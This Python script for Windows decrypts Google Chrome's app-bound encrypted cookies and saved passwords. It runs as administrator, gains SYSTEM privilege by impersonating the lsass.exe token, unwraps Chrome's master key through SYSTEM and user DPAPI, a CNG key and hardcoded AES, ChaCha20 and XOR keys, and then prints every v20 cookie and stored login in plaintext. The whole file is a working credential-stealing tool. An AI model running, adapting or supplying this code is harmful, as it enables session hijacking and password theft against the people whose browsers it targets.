import binascii
import ctypes
import io
import json
import os
import pathlib
import shutil
import sqlite3
import struct
import tempfile
from contextlib import contextmanager

import windows
import windows.crypto
import windows.generated_def as gdef
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get NT_AUTHORITY/SYSTEM privilege"""
    original_token = windows.current_thread.token  # current process token backup
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")  # search lsass.exe
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(type=gdef.TokenImpersonation, impersonation_level=gdef.SecurityImpersonation)
        windows.current_thread.token = impersonation_token
        yield  # keyword: ret val & suspend
    finally:
        windows.current_thread.token = original_token  # backup


def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)  # bytes => like file object(read, write, etc.)
    parsed_data = {}  # dict

    header_len = struct.unpack("<I", buffer.read(4))[0]  # validation data length
    parsed_data["header"] = buffer.read(header_len)  # extract: validation data
    content_len = struct.unpack("<I", buffer.read(4))[0]  # key length
    assert header_len + content_len + 8 == len(blob_data)

    parsed_data["flag"] = buffer.read(1)[0]
    print()
    print(f"[!] parsed_data['header']: {parsed_data['header'].decode('utf-8')}")
    print()

    # $ legacy
    if parsed_data["flag"] == 1 or parsed_data["flag"] == 2:
        # [  flag  |    iv   | ciphertext |   tag   ] decrypted_blob
        # [  1byte | 12bytes |   32bytes  | 16bytes ]
        parsed_data["iv"] = buffer.read(12)
        parsed_data["ciphertext"] = buffer.read(32)
        parsed_data["tag"] = buffer.read(16)

    # $ v20
    elif parsed_data["flag"] == 3:
        # [  flag  | encrypted_aes_key |    iv   | ciphertext |   tag   ] decrypted_blob
        # [  1byte |       32bytes     | 12bytes |   32bytes  | 16bytes ]
        parsed_data["encrypted_aes_key"] = buffer.read(32)
        parsed_data["iv"] = buffer.read(12)
        parsed_data["ciphertext"] = buffer.read(32)
        parsed_data["tag"] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data


def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)  # Open CNG provider
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)  # Receive selected key handler
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(  # Decrypt to encrypted_aes_key with 'Google ChromeKey1'
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),  # 1st: Get output_buffer length
        0x40,  # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40,  # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[: pcbResult.value])


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data["flag"] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)

    elif parsed_data["flag"] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)

    elif parsed_data["flag"] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data["encrypted_aes_key"])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)

    return cipher.decrypt(parsed_data["iv"], parsed_data["ciphertext"] + parsed_data["tag"], None)


def main():
    # chrome data path
    user_profile = os.environ["USERPROFILE"]  # C:\Users\user
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"  # app_boud_encrypted_key path
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"  # cookies path
    pw_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"  # p.w path

    # Read Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"  # Check prefix("APPB")
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]  # remove prefix and transform base64 decoded byte

    # Decrypt with SYSTEM DPAPI
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)  # NT_AUTORITY/SYSTEM privilege

    """
        app_bound_encrypted_key decrypt flow: SYSTEM DPAPI => USER DPAPI => 
    """
    # Decrypt with user DPAPI
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)  # USER privilege

    # Parse key blob
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

    def __decrypt_cookie_v20(cookie_cipher, encrypted_value):
        cookie_iv = encrypted_value[3 : 3 + 12]
        encrypted_cookie = encrypted_value[3 + 12 : -16]
        cookie_tag = encrypted_value[-16:]
        decrypted_cookie = cookie_cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
        return decrypted_cookie[32:].decode("utf-8")  # ret: remove 32bytes dummy

    def __decrypt_pw_v20(pw_cipher, encrypted_value):
        cookie_iv = encrypted_value[3 : 3 + 12]
        encrypted_cookie = encrypted_value[3 + 12 : -16]
        cookie_tag = encrypted_value[-16:]
        decrypted_pw = pw_cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
        return decrypted_pw.decode("utf-8")

    # tempfile: create temporary file would be autonomous del
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_cookie_path = os.path.join(temp_dir, "TempCookies")
        temp_pw_path = os.path.join(temp_dir, "TempLoginData")

        try:
            # all db files: format(SQLite3) & Locked
            shutil.copy2(cookie_db_path, temp_cookie_path)
            shutil.copy2(pw_db_path, temp_pw_path)

            # $ Read Cookies
            # mode=readonly , as_uri(): file://C:/Users/user/AppData/Local/temp_file.db
            cookie_uri = pathlib.Path(temp_cookie_path).as_uri() + "?mode=ro"
            con_cookie = sqlite3.connect(cookie_uri, uri=True)
            cur_cookie = con_cookie.cursor()
            cur_cookie.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
            cookies = cur_cookie.fetchall()
            cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
            con_cookie.close()

            # decrypt v20 cookie with AES-256-GCM
            # [  flag  |    iv   | ciphertext |   tag   ] BLOB
            # [ 3bytes | 12bytes |     var    | 16bytes ]
            cookie_cipher = AESGCM(v20_master_key)
            print("[+] ========== Cookies Start ==========")
            for c in cookies_v20:
                try:
                    print(c[0], c[1], __decrypt_cookie_v20(cookie_cipher, c[2]))  # decrypt blob
                except Exception as e:
                    print(f"Cookie Decrypt Error ({c[1]}): {e}")
            print("[+] ========== Cookies Done ==========")

            # $ Read Login Data
            pw_uri = pathlib.Path(temp_pw_path).as_uri() + "?mode=ro"
            con_pw = sqlite3.connect(pw_uri, uri=True)
            cur_pw = con_pw.cursor()
            cur_pw.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
            logins = cur_pw.fetchall()
            con_pw.close()

            pw_cipher = cookie_cipher
            print("[+] ========== Logins Start ==========")
            print(f"{'Origin URL':<90} {'Username':<30} {'Password':<30}")
            print("-" * 150)
            for l in logins:
                try:
                    # 텍스트 내 개행문자 제거 및 최대 길이 제한으로 레이아웃 유지
                    url = l[0].strip().replace("\r", "").replace("\n", "")
                    username = l[1].strip().replace("\r", "").replace("\n", "")
                    password = __decrypt_pw_v20(pw_cipher, l[2]).strip().replace("\r", "").replace("\n", "")

                    print(f"{url:<90.90} {username:<30.30} {password:<30.30}")
                    print("-" * 150)
                except Exception as e:
                    print(f"Login Data Decrypt Error ({l[1]}): {e}")
                    print("[-]", end=" ")
                    print("-" * 148)
            print("[+] ========== Logins Done ==========")

        except PermissionError as e:
            if e.winerror == 32:
                print(
                    "Permission denied when accessing the cookie database. This is expected if Chrome is running. Please close Chrome and try again."
                )
            else:
                print(f"Permission error: {e}")


if __name__ == "__main__":
    if not is_admin():
        print("This script needs to run as administrator.")
    else:
        main()
